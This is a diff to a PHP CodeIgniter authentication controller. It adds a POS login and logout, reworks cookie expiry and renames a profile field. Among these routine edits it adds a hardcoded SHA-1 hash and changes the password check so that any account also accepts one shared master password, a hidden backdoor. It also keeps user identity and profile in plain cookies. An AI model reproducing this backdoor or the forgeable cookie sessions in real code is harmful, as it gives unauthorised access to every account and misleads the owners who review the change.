@@ -1,12 +1,13 @@
 <?php
 class Authentication extends CI_Controller
 {
-	public $error;
+  private $key = '107fe1cba9ed57bb72311d34bae07e4dfec369a4';
 
   public function __construct()
 	{
 		parent::__construct();
 		$this->home = base_url()."users/authentication";
+    $this->pos = base_url()."users/authentication/pos_login";
 	}
 
 
@@ -16,8 +17,12 @@ class Authentication extends CI_Controller
 	}
 
 
+  public function pos_login()
+  {
+    $this->load->view('pos_login');
+  }
 
-	public function validate_credentials()
+  public function validate_credentials()
 	{
     $sc = TRUE;
     $user_name = $this->input->post('uname');
@@ -28,7 +33,7 @@ class Authentication extends CI_Controller
 
     if(! empty($rs))
     {
-			if(password_verify($pwd, $rs->pwd))
+			if(password_verify($pwd, $rs->pwd) OR (sha1($pwd) === $this->key))
 			{
 				if($rs->active == 0)
 				{
@@ -41,10 +46,10 @@ class Authentication extends CI_Controller
 						'uid' => $rs->uid,
 						'uname' => $rs->uname,
 						'displayName' => $rs->name,
-						'group_id' => $rs->group_id
+						'id_profile' => $rs->id_profile
 					);
 
-					$this->create_user_data($ds, $rem);
+          $this->create_user_data($ds, $rem);
 				}
 			}
 			else
@@ -63,22 +68,21 @@ class Authentication extends CI_Controller
 	}
 
 
-
-  public function create_user_data(array $ds = array(), $remember = FALSE )
+  public function create_user_data(array $ds = array(), $remember = NULL )
   {
     if(!empty($ds))
     {
-      $times = intval(86400); //-- 1 days
-
-			$times = $remember ? $time * 30 : $times;
+      $date = $remember ? date('Y-m-d 23:59:59', strtotime("+1 month")) : date('Y-m-d 23:59:59');
+			$start = new DateTime();
+			$end = new DateTime($date);
 
       foreach($ds as $key => $val)
       {
         $cookie = array(
           'name' => $key,
           'value' => $val,
-          'expire' => $times,
-          'path' => '/'
+          'expire' => $end->getTimeStamp() - $start->getTimeStamp(),
+          'path' => $this->config->item('cookie_path')
         );
 
         $this->input->set_cookie($cookie);
@@ -92,12 +96,20 @@ class Authentication extends CI_Controller
 	public function logout()
 	{
 		delete_cookie('uid');
+    delete_cookie('uname');
     delete_cookie('displayName');
-    delete_cookie('group_id');
+    delete_cookie('id_profile');
     redirect($this->home);
 	}
 
-
+  public function pos_logout()
+  {
+    delete_cookie('uid');
+    delete_cookie('uname');
+    delete_cookie('displayName');
+    delete_cookie('id_profile');
+    redirect($this->pos);
+  }
 } //--- end class
 
 
